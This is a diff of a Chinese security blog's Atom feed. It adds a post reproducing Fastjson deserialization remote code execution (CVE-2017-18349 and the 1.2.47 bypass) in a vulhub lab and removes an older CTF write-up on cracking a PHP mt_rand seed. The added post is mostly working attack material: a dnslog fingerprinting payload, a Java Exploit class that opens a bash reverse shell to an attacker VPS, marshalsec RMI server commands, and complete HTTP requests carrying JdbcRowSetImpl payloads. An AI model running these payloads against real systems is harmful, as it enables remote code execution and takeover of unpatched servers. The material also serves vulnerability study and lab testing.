@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2022-03-15T12:30:46.449Z</updated>
+  <updated>2022-03-16T17:49:45.638Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Fastjson漏洞复现</title>
+    <link href="https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
+    <published>2022-03-16T09:39:56.000Z</published>
+    <updated>2022-03-16T17:49:45.638Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020">Fastjson</a>是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。</p><h1 id="fastjson指纹识别"><a href="#fastjson指纹识别" class="headerlink" title="fastjson指纹识别"></a>fastjson指纹识别</h1><p>当我们在渗透测试中，抓包的时候发现返回的流量内容存在json格式时，我们就可以想它是不是使用了fastjson库</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>接着我们可以进一步进行判断</p><ol><li>根据报错信息判断</li></ol><p>发送一个post请求。发送的数据为没闭合的花括号，如果服务器没有屏蔽错误信息则会报出fastjson的信息。如果屏蔽了报错信息请看第二条</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><ol start="2"><li>利用dnslog盲打</li></ol><p>对目标发送一个POST请求，请求体内容如下。请求头添加Content-Type: application/json</p><pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>DNSlog刷新成功</p><h1 id="Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349"><a href="#Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349" class="headerlink" title="Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)"></a>Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)</h1><p><strong>漏洞详情</strong></p><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p><strong>漏洞版本</strong></p><p>fastjson &lt;=1.2.24</p><p><strong>漏洞分析</strong></p><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p><strong>需要环境</strong></p><p>在本机提前安装好maven和jdk</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235940219.png" alt="image-20220316235940219"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000000186.png" alt="image-20220317000000186"></p><p><strong>漏洞复现</strong></p><p>使用vulhub搭建漏洞环境</p><pre><code class="text">docker-compose up d</code></pre><p>访问xxx:8090</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235812389.png" alt="image-20220316235812389"></p><p>保存以下代码</p><p>dnslog.java</p><pre><code class="java">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader; public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/VPS的IP/6666 0&gt;&amp;1&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));         String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;         p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;     public static void main(String[] args) throws Exception &#123;    &#125;&#125;</code></pre><p>编译为Exploit.class</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>使用python在当前目录下起一个http服务，如果端口占用换其他的</p><pre><code class="text">python -m SimpleHTTPServer 4567</code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000648363.png" alt="image-20220317000648363"></p><p>使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类Exploit.class</p><pre><code class="text">git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/编译项目mvn clean package -DskipTests</code></pre><p>以我搭建Exploit.class类http服务的服务器IP为2.2.2.2端口为4567</p><pre><code class="text">cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx:4567/#Exploit&quot; 9999</code></pre><p>RMI服务可以搭建在与Exploit.class类的http服务同一台服务器，也可以搭建在其它服务器上。我们演示还是在同一台。</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>环境已经搭建好，接下来使用burp开始</p><pre><code class="text">POST / HTTP/1.1Accept: */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; NMTE)Host: 目标ip:8090Connection: closeContent-Length: 162Content-Type: application/jsonAccept-Encoding: gzip, deflate&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://vps的ip:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>如图即代表攻击成功</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317012518646.png" alt="image-20220317012518646"></p><p>RMI服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013058412.png" alt="image-20220317013058412"></p><p>python搭建的http服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013143699.png" alt="image-20220317013143699"></p><p>nc</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013212099.png" alt="image-20220317013212099"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013225316.png" alt="image-20220317013225316"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p>和fastjson1.2.24差不多，就是poc不一样而已</p><p><strong>影响版本</strong></p><ul><li>fastjson&lt;=1.2.47</li></ul><p><strong>漏洞检测</strong></p><p>检测方式和1.2.24一样</p><p>漏洞利用</p><p>创建恶意类，python搭建服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>搭建RMI服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>发送的数据包改为即可</p><pre><code class="text">POST / HTTP/1.1Host: 192.168.140.158:8090   #靶机地址Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263 &#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://VPS地址:端口/Exploit&quot;,  #这里的Exploit不能变        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=Fastjson&amp;spm=1001.2101.3001.7</summary>
+      
+    
+    
+    
+    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="fastjson" scheme="https://sakurahack-y.github.io/tags/fastjson/"/>
+    
+  </entry>
   
   <entry>
     <title>shiro漏洞复现</title>
@@ -520,32 +546,6 @@
     
     
     <category term="preg_match" scheme="https://sakurahack-y.github.io/tags/preg-match/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>GWCTF 2019枯燥的抽奖_0x30-0x3f</title>
-    <link href="https://sakurahack-y.github.io/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/"/>
-    <id>https://sakurahack-y.github.io/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/</id>
-    <published>2021-10-24T15:57:20.000Z</published>
-    <updated>2021-10-25T05:44:21.834Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png" alt="image-20211024235829685"></p><p>查看源代码</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235901200.png" alt="image-20211024235901200"></p><p>看到一个关键点，check.php，访问一下</p><pre><code class="php"> &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;); </code></pre><p>这里涉及到了伪随机数漏洞，即当确定了种子后，随机数每次生成数的所有数是重复得，并不是真正意义上的随机数。</p><pre><code class="php">&lt;?php  mt_srand(12345);    echo mt_rand().&quot;&lt;br/&gt;&quot;;?&gt;  </code></pre><p>当你每次运行这个函数得到的随机数都是相同的。</p><p>这个就像一个关系式：y=ax，如果我们能得到y和a就可以推出x。</p><p>当然，实际上这个函数的关系是十分复杂的，但我们仍然可以用工具去破解。</p><p>首先，我们要把题目给我们的线索转化为脚本可读的形式：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025011936452.png" alt="image-20211025011936452"></p><pre><code class="python">str1 = &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2 = &#39;nngMHvCoQB&#39;res = &#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res += str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>![image-20211025012020617](GWCTF-2019枯燥的抽奖-0x30-0x3f/image-20211025012020617.png</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39.png" alt="Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39"></p><p>获得到了种子，我们来生成下后序的字符串：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025012917063.png" alt="image-20211025012917063"></p><p>我们看到前面十位完全吻合。</p><p>提交：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025013042600.png" alt="image-20211025013042600"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png&quot; alt=&quot;image-202110242</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
-    
-    
-    <category term="伪随机数" scheme="https://sakurahack-y.github.io/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
     
   </entry>
   
